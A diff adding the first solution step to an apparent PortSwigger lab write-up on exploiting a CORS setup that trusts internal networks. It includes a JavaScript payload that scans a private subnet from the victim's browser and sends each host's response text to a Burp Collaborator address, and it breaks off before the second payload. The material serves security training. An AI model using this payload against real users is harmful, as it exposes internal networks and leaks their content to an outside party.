@@ -161,3 +161,36 @@ This website has an insecure CORS configuration in that it trusts all internal n
 
 This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (`192.168.0.0/24`, port `8080`) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user `Carlos`
 
+### Sol :
+
+* First we need to scan the local network for the endpoint.
+* Enter below payload to scan for the local network(`192.168.0.0/24, 8080`)
+* Replace the `collaboratorURL` with your own URL.
+
+        <html>
+          <script>
+        collaboratorURL = 'http://d4i329wl1e1wjgh7cec94oo51w7mvb.burpcollaborator.net'
+
+        for (let i=0; i<256; i++){
+            fetch('http://192.168.0.' + i + ':8080')
+            .then(response => response.text())
+            .then (text => {
+                try {
+
+                fetch(collaboratorURL + '?ip=' + 'http://192.168.0.' + i + "&code=" + encodeURIComponent(text))
+                } catch(err){
+
+                }
+            })
+        }
+          </script>
+      </html>
+
+* Click Store and click `Deliver exploit to victim`.
+* We can see the output at burp collaborator
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/083c84f1-cd5d-4569-874b-07bd3710d119)
+
+* We got the IP as `192.168.0.161`.
+* Enter below second payload to check the probing of username field for an XSS vulnerability
+* 
